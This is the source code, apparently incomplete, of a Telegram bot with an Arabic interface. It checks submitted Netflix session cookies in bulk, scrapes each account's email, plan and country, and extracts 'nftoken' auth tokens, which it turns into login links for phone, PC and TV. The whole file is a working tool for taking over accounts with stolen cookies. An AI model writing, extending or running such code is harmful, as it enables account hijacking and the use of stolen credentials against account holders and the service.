import asyncio
import aiohttp
import re
import os
import logging
import json
from urllib.parse import unquote, quote
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import ParseMode, InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = os.getenv("BOT_TOKEN", "")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN غير موجود")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Form(StatesGroup):
    waiting_cookies = State()
    waiting_cookie_file = State()

def main_menu():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 بدء فحص ملف جديد", callback_data="start_check"),
        InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info")
    )
    return keyboard

def input_method():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("📄 إرسال ملف", callback_data="send_file"),
        InlineKeyboardButton("📝 كتابة النص", callback_data="send_text")
    )
    return keyboard

def result_actions(nftoken):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("📱 نسخ رابط الهاتف", callback_data=f"copy_phone:{nftoken}"),
        InlineKeyboardButton("💻 نسخ رابط الكمبيوتر", callback_data=f"copy_pc:{nftoken}"),
        InlineKeyboardButton("📺 نسخ رابط التلفاز", callback_data=f"copy_tv:{nftoken}"),
        InlineKeyboardButton("🔑 نسخ nftoken", callback_data=f"copy_token:{nftoken}"),
        InlineKeyboardButton("🔄 فحص كوكيز آخر", callback_data="start_check")
    )
    return keyboard

async def extract_nftoken_from_page(session, headers, cookie_str):
    """استخراج nftoken من صفحة الحساب أو من الـ API"""
    nftoken = ''

    # 1. محاولة من صفحة YourAccount
    try:
        async with session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=10) as resp:
            if resp.status == 200:
                text = await resp.text()

                # البحث عن nftoken في النص
                patterns = [
                    r'nftoken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'https?://[^"\']*nftoken=([^&"\']+)',
                    r'authURL["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'authUrl["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'"nftoken"\s*:\s*"([^"]+)"',
                ]
                for pattern in patterns:
                    match = re.search(pattern, text)
                    if match:
                        nftoken = match.group(1)
                        # لو كان authURL كامل، نستخرج nftoken منه
                        if 'nftoken=' in nftoken:
                            token_match = re.search(r'nftoken=([^&]+)', nftoken)
                            if token_match:
                                nftoken = token_match.group(1)
                        break
    except:
        pass

    # 2. لو مش لاقيين، جرب API tokens
    if not nftoken:
        try:
            token_url = 'https://www.netflix.com/api/shakti/v1/tokens'
            token_headers = {
                'User-Agent': headers['User-Agent'],
                'Accept': 'application/json',
                'Cookie': cookie_str,
                'Referer': 'https://www.netflix.com/',
                'Content-Type': 'application/json'
            }
            async with session.post(token_url, headers=token_headers, json={}) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    nftoken = data.get('token') or data.get('authToken') or data.get('nftoken') or ''
        except:
            pass

    # 3. لو لسه فاضي، نرجع من NetflixId
    if not nftoken:
        cookies_dict = {}
        for cookie in cookie_str.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies_dict[name.strip()] = value.strip()
        netflix_id = unquote(cookies_dict.get('NetflixId', ''))
        ct_match = re.search(r'ct=([^&]+)', netflix_id)
        if ct_match:
            nftoken = ct_match.group(1)

    return nftoken

async def check_netflix_cookie(cookie_str: str) -> dict:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cookie': cookie_str,
        'Connection': 'keep-alive',
    }

    result = {
        'valid': False,
        'email': None,
        'plan': None,
        'country': None,
        'nftoken': None,
        'error': None
    }

    timeout = aiohttp.ClientTimeout(total=10)

    async with aiohttp.ClientSession(timeout=timeout) as session:
        try:
            async with session.get('https://www.netflix.com/YourAccount', headers=headers) as resp:
                if resp.status == 200:
                    text = await resp.text()

                    email_match = re.search(r'email["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if email_match:
                        result['email'] = email_match.group(1)

                    plan_match = re.search(r'plan["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if plan_match:
                        result['plan'] = plan_match.group(1)

                    country_match = re.search(r'country["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if country_match:
                        result['country'] = country_match.group(1)

                    result['valid'] = True
                else:
                    result['error'] = f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            result['error'] = "انتهت مهلة الفحص"
        except Exception as e:
            result['error'] = str(e)

        if result['valid']:
            result['nftoken'] = await extract_nftoken_from_page(session, headers, cookie_str)

    return result

async def check_multiple_cookies(cookies_list: list) -> list:
    tasks = [check_netflix_cookie(cookie) for cookie in cookies_list]
    return await asyncio.gather(*tasks)

# ... (باقي الكود نفس ما هو في آخر نسخة)
